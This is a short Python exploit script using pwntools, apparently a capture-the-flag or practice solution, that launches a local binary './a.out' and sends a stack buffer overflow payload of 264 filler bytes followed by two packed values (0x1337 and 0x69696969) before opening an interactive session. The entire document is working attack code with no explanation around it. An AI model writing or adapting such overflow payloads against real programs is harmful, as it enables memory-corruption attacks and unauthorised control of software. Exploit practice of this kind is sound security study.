from pwn import *
p=process('./a.out')
payload=b's'*264+p32(0x1337)+p32(0x69696969)
p.sendline(payload)
p.interactive()
